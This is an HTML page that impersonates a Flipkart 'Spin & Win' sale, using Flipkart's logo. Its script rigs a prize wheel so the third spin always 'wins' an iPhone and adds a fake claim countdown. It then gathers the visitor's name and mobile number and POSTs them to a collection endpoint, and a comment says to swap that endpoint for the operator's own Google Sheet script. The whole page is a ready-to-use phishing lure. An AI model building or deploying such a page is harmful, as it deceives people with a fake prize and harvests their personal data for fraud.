<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéâ Spin & Win ‚Äì Flipkart Big Sale!</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #f1f3f6;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    header {
      background: #2874f0;
      color: white;
      padding: 12px;
      font-size: 1.3em;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header img { height: 36px; }
    .cart {
      font-size: 1em;
      background: #ffeb3b;
      color: #2874f0;
      padding: 4px 10px;
      border-radius: 12px;
    }

    .wheel-container {
      position: relative;
      margin: 20px auto;
      width: 320px;
      height: 320px;
    }
    .wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 10px solid #2874f0;
      background: conic-gradient(
        #ffeb3b 0deg 60deg,
        #2874f0 60deg 120deg,
        #ff7043 120deg 180deg,
        #43a047 180deg 240deg,
        #9c27b0 240deg 300deg,
        #ff9800 300deg 360deg
      );
      transition: transform 4s ease-out;
      position: relative;
    }
    .pointer {
      width: 0;
      height: 0;
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-bottom: 30px solid red;
      position: absolute;
      top: -35px;
      left: 50%;
      transform: translateX(-50%);
    }
    .label {
      position: absolute;
      width: 80px;
      text-align: center;
      font-size: 1em;
      font-weight: bold;
      top: 50%;
      left: 50%;
      transform-origin: 0 -120px;
      color: white;
    }

    .spin-btn {
      background: #ffeb3b;
      color: #2874f0;
      padding: 14px 24px;
      border-radius: 8px;
      font-size: 1.2em;
      border: none;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }

    .hidden { display: none; }

    #result {
      font-size: 1.4em;
      color: #d32f2f;
      font-weight: bold;
      margin-top: 20px;
    }

    #claimSection {
      margin: 40px auto;
    }
    #claimBtn {
      display: none;
      background: #2874f0;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1.2em;
      margin-top: 20px;
    }

    #userForm {
      margin: 20px auto;
      display: none;
    }
    input {
      padding: 10px;
      margin: 8px;
      width: 80%;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    #submitBtn {
      background: green;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
    }
  </style>
</head>
<body>

  <header>
    <div><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Flipkart_logo.svg" alt="Flipkart Logo"></div>
    <div><span>Big Billion Days ‚Äì Spin & Win üé°</span></div>
    <div class="cart" id="cart">Cart: 0</div>
  </header>

  <p>You have <b>3 Spins</b>. Win exciting prizes üéÅ</p>

  <div class="wheel-container" id="gameArea">
    <div class="pointer"></div>
    <div id="wheel" class="wheel">
      <div class="label" style="transform: rotate(30deg) translateY(-120px);">iPhone</div>
      <div class="label" style="transform: rotate(90deg) translateY(-120px);">iPad</div>
      <div class="label" style="transform: rotate(150deg) translateY(-120px);">PS5</div>
      <div class="label" style="transform: rotate(210deg) translateY(-120px);">Smartwatch</div>
      <div class="label" style="transform: rotate(270deg) translateY(-120px);">Nothing</div>
      <div class="label" style="transform: rotate(330deg) translateY(-120px);">Speaker</div>
    </div>
  </div>

  <button id="spinBtn" class="spin-btn">üé° Spin Now</button>
  <div id="result"></div>

  <div id="claimSection">
    <p id="claimMsg"></p>
    <button id="claimBtn">Claim Reward</button>
  </div>

  <!-- User form after first win -->
  <form id="userForm">
    <input type="text" id="name" placeholder="Enter your name" required><br>
    <input type="tel" id="mobile" placeholder="Enter your mobile number" required><br>
    <button type="submit" id="submitBtn">Submit</button>
  </form>

  <script>
    const wheel = document.getElementById("wheel");
    const spinBtn = document.getElementById("spinBtn");
    const result = document.getElementById("result");
    const claimMsg = document.getElementById("claimMsg");
    const claimBtn = document.getElementById("claimBtn");
    const cart = document.getElementById("cart");
    const userForm = document.getElementById("userForm");

    let spins = 0;
    let hasWon = false;
    let userSubmitted = false;

    spinBtn.addEventListener("click", () => {
      spins++;
      let degree;

      if (spins === 1) {
        degree = 1800 + 270; // Always fail (Nothing)
      } else if (spins === 2) {
        degree = 1800 + 90; // iPad (not iPhone)
      } else {
        degree = 1800 + 30; // iPhone
        hasWon = true;
      }

      wheel.style.transform = `rotate(${degree}deg)`;

      setTimeout(() => {
        if (spins === 1) {
          result.textContent = "‚ùå Oops! No luck this time.";
        } else if (spins === 2) {
          result.textContent = "Almost there! You got iPad.";
        } else {
          result.textContent = "üéâ Congratulations! You won an iPhone üéÅ";
        }

        // Show claim message after each spin
        claimMsg.textContent = "Scroll down to claim your reward ‚¨áÔ∏è";
        claimBtn.style.display = "inline-block";
        claimBtn.disabled = true;

        // Start 10s countdown
        let time = 10;
        claimBtn.textContent = `Claim Reward (${time})`;
        const timer = setInterval(() => {
          time--;
          claimBtn.textContent = `Claim Reward (${time})`;
          if (time === 0) {
            clearInterval(timer);
            claimBtn.disabled = false;
            claimBtn.textContent = "Claim Reward";
          }
        }, 1000);

        window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });

        if (spins >= 3) {
          spinBtn.disabled = true;
        }
      }, 4000);
    });

    claimBtn.addEventListener("click", () => {
      let cartCount = parseInt(cart.textContent.replace("Cart: ", ""));
      cart.textContent = `Cart: ${cartCount + 1}`;
      claimBtn.style.display = "none";

      // Ask user details only once
      if (hasWon && !userSubmitted) {
        userForm.style.display = "block";
      }
    });

    userForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const name = document.getElementById("name").value;
      const mobile = document.getElementById("mobile").value;

      // Save to Google Sheet (replace URL with your Apps Script)
      fetch("https://httpbin.org/post", {
        method: "POST",
        body: JSON.stringify({ name, mobile }),
        headers: { "Content-Type": "application/json" }
      });

      alert("‚úÖ Submitted successfully!");
      userForm.style.display = "none";
      userSubmitted = true;
    });
  </script>
</body>
</html>
